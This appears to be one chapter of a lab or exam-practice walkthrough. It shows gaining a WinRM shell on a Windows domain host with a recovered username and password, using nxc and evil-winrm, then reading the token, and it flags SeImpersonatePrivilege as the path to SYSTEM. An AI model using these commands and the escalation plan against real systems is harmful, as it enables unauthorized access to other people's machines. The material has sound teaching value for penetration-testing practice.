# 02 — Foothold: WinRM as `eric.wallows`

The credential is not an administrator, so SMB gives nothing beyond a `[+]`. WinRM is different:
`BUILTIN\Remote Management Users` is enough to get a shell, and a shell is enough to look at the
token.

## 2.1 One command to a shell

```bash
nxc winrm 192.168.118.147 -u eric.wallows -p 'EricLikesRunning800' -x whoami
```

```
oscp\eric.wallows
```

Or interactively:

```bash
evil-winrm -i 192.168.118.147 -u eric.wallows -p 'EricLikesRunning800'
```

Either way the result is the same: code execution as a plain domain user on a domain-joined server,
with no local administrative rights.

## 2.2 Reading the token

```powershell
whoami
whoami /groups
whoami /priv
```

`whoami` confirms the domain context:

```
oscp\eric.wallows
```

The parts of `whoami /groups` that matter, condensed:

| Group / label | SID | Why it matters |
|---|---|---|
| `BUILTIN\Users` | `S-1-5-32-545` | no administrative group anywhere in the token |
| `BUILTIN\Remote Management Users` | `S-1-5-32-580` | this is the group that allowed WinRM |
| `NT AUTHORITY\NETWORK` | `S-1-5-2` | logon is over the network, not interactive |
| `Mandatory Label\High Mandatory Level` | `S-1-16-12288` | full token — **not** a privilege |

And the two privileges that decide the rest of the box:

| Privilege | State | Consequence |
|---|---|---|
| `SeImpersonatePrivilege` | **Enabled** | impersonate any token that connects to a service we control → SYSTEM |
| `SeDebugPrivilege` | absent | cannot open LSASS from this token |

## 2.3 Two things that look wrong

**High integrity without administrative rights.** A remote network logon is not UAC-filtered the way
an interactive logon is, so the token is a full one and carries the High mandatory label. The label
describes the token, not what the account is allowed to do — `BUILTIN\Administrators` is still
missing from the group list, and nothing administrative works.

**`SeImpersonatePrivilege` on a normal user.** Normally only service accounts (`LocalSystem`,
`NetworkService`, virtual accounts) hold this. Here it is in the base token of a domain user, which
is the entire escalation path handed over in advance: any process that can be made to authenticate
to a named pipe we own can be impersonated, and the classic result is `nt authority\system`.

Verifying the negative is worth the ten seconds, because it changes the plan:

```powershell
net config workstation
```

```
System error 5 has occurred.

Access is denied.
```

That is expected for a non-administrator and is not a broken host — `net config` reads from a
privileged registry path. `whoami /groups` already gave the same answer without the error.

## 2.4 Next

`SeImpersonatePrivilege` plus a local service that can be coerced into authenticating is a
well-trodden path: a potato. Chapter 03 runs it.
